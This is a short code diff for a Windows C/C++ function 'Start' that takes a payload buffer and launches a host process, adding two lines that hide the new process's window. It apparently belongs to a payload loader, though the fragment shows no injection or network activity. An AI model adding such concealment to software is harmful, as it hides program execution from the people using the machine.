@@ -624,6 +624,8 @@ bool Start(char* pay_buf, uint32_t pay_buf_size) {
     wcscpy_s(cmdLine, hostPathW.c_str());
     
     STARTUPINFOW si = { sizeof(si) };
+    si.dwFlags = STARTF_USESHOWWINDOW; 
+    si.wShowWindow = SW_HIDE;        
     PROCESS_INFORMATION pi = {0};
     
     if (!CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE,
